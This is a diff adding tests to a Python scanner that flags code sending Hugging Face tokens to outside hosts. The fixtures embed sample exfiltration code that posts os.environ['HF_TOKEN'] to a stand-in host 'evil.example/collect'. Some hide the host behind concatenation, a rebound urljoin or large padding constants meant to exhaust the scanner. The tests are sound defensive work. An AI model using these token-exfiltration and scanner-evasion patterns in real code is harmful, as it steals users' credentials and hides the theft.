@@ -4176,9 +4176,23 @@ def test_inlining_a_constant_is_charged_per_use():
         'url = ' + " + ".join(["BIG"] * 100) + '\n'
         'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
     )
+    # And running out refuses rather than analysing what it could not read:
+    # leaving the rest of the file unsubstituted is exactly the state a payload
+    # wants, a long constant ahead of the three short ones that spell a host.
     started = time.perf_counter()
-    assert module.scan_converter_source(source) == []
+    assert [f.check for f in module.scan_converter_source(source)]
     assert time.perf_counter() - started < 5
+    assert [
+        f.check for f in module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'PAD = "' + "A" * 600_000 + '"\n'
+            'pad_again = PAD\n'
+            'scheme = "https"\nsep = "://"\nhost = "evil.example/collect"\n'
+            'url = scheme + sep + host\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
 
     # Appending carries the same ceiling the join and the formatting do, since
     # a chain of literal appends grows a prefix at every level whether a name
@@ -4294,6 +4308,48 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
         preamble + 'url = "{}/api/models".format(HUB)\n'
         + 'requests.get(url, ' + token
     ) == []
+
+
+def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
+    """`j = urljoin` rebinds the builder with no import in sight, so following
+    import aliases was not enough: a single assignment of one name to another is
+    followed the same way.
+
+    And the folding itself is budgeted, not only its results. Each fold carries
+    an output ceiling and the destination walk charges what it reads, but the
+    folding happens in several places and the carrier fixpoint alone reads every
+    assignment up to sixteen times: two hundred joins of a megabyte apiece sit
+    inside every individual ceiling and are still hundreds of megabytes of work.
+    Running out refuses, since folding is how this reads a destination at all.
+    """
+    module = _load(
+        "converter_scan_rebind_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\nfrom urllib.parse import urljoin\n'
+            'HUB = "https://huggingface.co"\n'
+            'j = urljoin\n'
+            'url = j(HUB, "//evil.example/collect")\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+    # Fifteen hundred of them is 6.4 MB, just inside the 8 MiB the scan
+    # accepts, and every join is inside its own ceiling: 31 seconds of folding
+    # without the budget on the work, 11 with it.
+    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    started = time.perf_counter()
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            + "".join(f"x{i} = {one}" for i in range(1_500))
+            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+    assert time.perf_counter() - started < 20
 
 
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
